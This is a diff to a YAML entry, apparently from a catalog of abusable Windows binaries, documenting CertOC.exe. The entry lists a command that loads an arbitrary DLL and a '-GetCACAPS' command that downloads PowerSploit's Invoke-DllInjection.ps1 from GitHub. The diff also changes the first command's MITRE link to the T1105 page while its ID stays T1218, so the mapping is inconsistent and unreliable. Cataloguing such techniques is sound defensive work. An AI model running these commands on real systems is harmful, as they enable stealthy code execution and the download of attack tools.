@@ -2,7 +2,7 @@
 Name: CertOC.exe
 Description: Used for installing certificates
 Author: 'Ensar Samil'
-Created: '2021-10-07'
+Created: 2021-10-07
 Commands:
   - Command: certoc.exe -LoadDLL "C:\test\calc.dll"
     Description: Loads the target DLL file
@@ -10,7 +10,7 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    MitreLink: https://attack.mitre.org/techniques/T1105/
     OperatingSystem: Windows Server 2022
   - Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
     Description: Downloads text formatted files
@@ -18,7 +18,7 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
+    MitreLink: https://attack.mitre.org/techniques/T1105/
     OperatingSystem: Windows Server 2022  
 Full_Path:
   - Path: c:\windows\system32\certoc.exe
